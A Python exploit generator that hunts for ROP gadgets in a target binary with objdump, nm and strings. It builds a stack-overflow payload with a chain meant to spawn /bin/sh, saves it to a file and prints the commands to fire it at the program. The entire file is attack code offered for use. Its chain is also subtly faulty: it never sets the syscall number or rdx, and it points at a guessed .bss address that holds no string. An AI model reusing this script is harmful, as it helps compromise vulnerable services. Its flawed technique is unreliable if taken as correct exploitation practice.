#!/usr/bin/env python3
"""
ROP Exploit for Vulnerable Legacy Service

This script demonstrates a complete ROP (Return-Oriented Programming) exploit
that bypasses NX (non-executable stack) protection by chaining together
existing code gadgets in the target binary.

The exploit chain:
1. Overflow the buffer to control return address
2. Build ROP chain using gadgets from the binary
3. Execute system("/bin/sh") or execve("/bin/sh", NULL, NULL)

Author: Security Research Team
Date: 2024
"""

import struct
import sys
import os
import subprocess
import re

def p64(addr):
    """Pack a 64-bit address in little-endian format"""
    return struct.pack('<Q', addr)

def find_gadgets(binary_path):
    """
    Find useful ROP gadgets in the binary using objdump
    Returns a dictionary of gadget addresses
    """
    gadgets = {}
    
    try:
        # Disassemble the binary
        result = subprocess.run(
            ['objdump', '-d', binary_path],
            capture_output=True,
            text=True,
            check=True
        )
        
        lines = result.stdout.split('\n')
        
        for i, line in enumerate(lines):
            # Look for pop rdi; ret
            if 'pop' in line and 'rdi' in line:
                match = re.search(r'([0-9a-f]+):', line)
                if match and i + 1 < len(lines) and 'ret' in lines[i + 1]:
                    gadgets['pop_rdi'] = int(match.group(1), 16)
                    print(f"[+] Found pop rdi; ret at 0x{gadgets['pop_rdi']:x}")
            
            # Look for pop rsi; pop r15; ret
            if 'pop' in line and 'rsi' in line:
                match = re.search(r'([0-9a-f]+):', line)
                if match:
                    gadgets['pop_rsi_r15'] = int(match.group(1), 16)
                    print(f"[+] Found pop rsi; pop r15; ret at 0x{gadgets['pop_rsi_r15']:x}")
            
            # Look for syscall
            if 'syscall' in line:
                match = re.search(r'([0-9a-f]+):', line)
                if match:
                    gadgets['syscall'] = int(match.group(1), 16)
                    print(f"[+] Found syscall at 0x{gadgets['syscall']:x}")
            
            # Look for ret gadget
            if line.strip().endswith('ret') and 'pop' not in line:
                match = re.search(r'([0-9a-f]+):', line)
                if match and 'ret' not in gadgets:
                    gadgets['ret'] = int(match.group(1), 16)
                    print(f"[+] Found ret at 0x{gadgets['ret']:x}")
        
    except subprocess.CalledProcessError as e:
        print(f"[-] Error running objdump: {e}")
        sys.exit(1)
    
    return gadgets

def find_functions(binary_path):
    """Find addresses of key functions"""
    functions = {}
    
    try:
        # Use nm to get symbol addresses
        result = subprocess.run(
            ['nm', binary_path],
            capture_output=True,
            text=True,
            check=True
        )
        
        for line in result.stdout.split('\n'):
            if 'process_command' in line:
                addr = line.split()[0]
                functions['process_command'] = int(addr, 16)
                print(f"[+] Found process_command at 0x{functions['process_command']:x}")
            
            if 'log_message' in line and 'log_message' not in functions:
                addr = line.split()[0]
                functions['log_message'] = int(addr, 16)
                print(f"[+] Found log_message at 0x{functions['log_message']:x}")
                
    except subprocess.CalledProcessError as e:
        print(f"[-] Error running nm: {e}")
    
    return functions

def find_strings(binary_path):
    """Find useful strings in the binary"""
    strings = {}
    
    try:
        # Use strings and grep to find /bin/sh
        result = subprocess.run(
            ['strings', '-t', 'x', binary_path],
            capture_output=True,
            text=True,
            check=True
        )
        
        for line in result.stdout.split('\n'):
            if '/bin/sh' in line:
                parts = line.strip().split()
                if len(parts) >= 2:
                    strings['bin_sh'] = int(parts[0], 16)
                    print(f"[+] Found '/bin/sh' at 0x{strings['bin_sh']:x}")
                    break
        
    except subprocess.CalledProcessError:
        pass
    
    return strings

def create_bin_sh_string():
    """Create /bin/sh string inline if not found in binary"""
    return b"/bin/sh\x00"

def build_rop_chain(gadgets, functions, strings, base_addr=0):
    """
    Build the ROP chain to execute system("/bin/sh")
    
    Strategy:
    1. Set up registers for execve syscall
    2. Use ROP gadgets to call execve("/bin/sh", NULL, NULL)
    """
    
    chain = b""
    
    print("\n[*] Building ROP chain...")
    
    # If we have a syscall gadget, we can do execve directly
    if 'syscall' in gadgets and 'pop_rdi' in gadgets:
        print("[*] Building execve ROP chain")
        
        # For execve("/bin/sh", NULL, NULL):
        # rax = 59 (execve syscall number)
        # rdi = pointer to "/bin/sh"
        # rsi = NULL
        # rdx = NULL
        
        # We need to embed /bin/sh somewhere
        # For this demo, we'll try to use existing strings or embed it
        
        if 'bin_sh' in strings:
            bin_sh_addr = base_addr + strings['bin_sh']
        else:
            # Use a writable section - for demo, we'll use a simplified approach
            # In a real exploit, you'd find a writable memory location
            bin_sh_addr = 0x404000  # Typical .bss section address
        
        # pop rdi; ret - set first argument (filename)
        if 'pop_rdi' in gadgets:
            chain += p64(gadgets['pop_rdi'])
            chain += p64(bin_sh_addr)
        
        # pop rsi; pop r15; ret - set second argument (argv)
        if 'pop_rsi_r15' in gadgets:
            chain += p64(gadgets['pop_rsi_r15'])
            chain += p64(0)  # NULL for argv
            chain += p64(0)  # dummy value for r15
        
        # syscall
        if 'syscall' in gadgets:
            chain += p64(gadgets['syscall'])
    
    else:
        print("[!] Limited gadgets available - building basic chain")
        # Fall back to calling a function
        if 'log_message' in functions:
            chain += p64(functions['log_message'])
    
    return chain

def generate_payload(binary_path):
    """Generate the complete exploit payload"""
    
    print("[*] Analyzing binary...")
    
    # Find gadgets and addresses
    gadgets = find_gadgets(binary_path)
    functions = find_functions(binary_path)
    strings = find_strings(binary_path)
    
    if not gadgets:
        print("[!] Warning: No gadgets found. Binary may be stripped or compiled differently.")
        print("[*] Creating a simpler crash payload for demonstration...")
    
    # Calculate buffer size and offset to return address
    # The buffer is 128 bytes, and we need to overflow past saved RBP (8 bytes)
    buffer_size = 128
    rbp_size = 8
    offset = buffer_size + rbp_size
    
    print(f"\n[*] Building payload:")
    print(f"    Buffer size: {buffer_size}")
    print(f"    RBP size: {rbp_size}")
    print(f"    Offset to return address: {offset}")
    
    # Build the payload
    payload = b"A" * offset  # Fill buffer and overwrite saved RBP
    
    # Add ROP chain
    rop_chain = build_rop_chain(gadgets, functions, strings)
    
    if rop_chain:
        payload += rop_chain
        print(f"    ROP chain length: {len(rop_chain)} bytes")
    else:
        # Simple crash payload - overwrite return address with recognizable value
        payload += p64(0x4141414141414141)  # AAAAAAAA
        print("    [!] Using simple crash payload (0x4141414141414141)")
    
    print(f"    Total payload size: {len(payload)} bytes")
    
    return payload

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <vulnerable_binary>")
        print("Example: python3 exploit.py ./vulnerable_service")
        sys.exit(1)
    
    binary_path = sys.argv[1]
    
    if not os.path.exists(binary_path):
        print(f"[-] Error: Binary not found: {binary_path}")
        sys.exit(1)
    
    print("=" * 60)
    print("  ROP Exploit Generator for Vulnerable Legacy Service")
    print("=" * 60)
    print()
    print("This exploit demonstrates Return-Oriented Programming (ROP)")
    print("to bypass NX (non-executable stack) protection.")
    print()
    
    # Generate the payload
    payload = generate_payload(binary_path)
    
    # Save payload to file
    output_file = "exploit_payload.bin"
    with open(output_file, 'wb') as f:
        f.write(payload)
    
    print(f"\n[+] Payload saved to: {output_file}")
    print(f"[+] Payload size: {len(payload)} bytes")
    print()
    print("[*] To test the exploit, run:")
    print(f"    ./{os.path.basename(binary_path)} \"$(cat {output_file})\"")
    print()
    print("[*] Or test with Python:")
    print(f"    python3 -c \"import sys; sys.stdout.buffer.write(open('{output_file}', 'rb').read())\" | ./{os.path.basename(binary_path)}")
    print()
    print("[!] WARNING: This may crash the program!")
    print()
    
    # Show hexdump of first part of payload
    print("[*] Payload preview (first 256 bytes):")
    preview = payload[:256]
    for i in range(0, len(preview), 16):
        hex_str = ' '.join(f'{b:02x}' for b in preview[i:i+16])
        ascii_str = ''.join(chr(b) if 32 <= b < 127 else '.' for b in preview[i:i+16])
        print(f"    {i:04x}: {hex_str:<48} {ascii_str}")
    
    if len(payload) > 256:
        print(f"    ... ({len(payload) - 256} more bytes)")
    
    print()

if __name__ == "__main__":
    main()
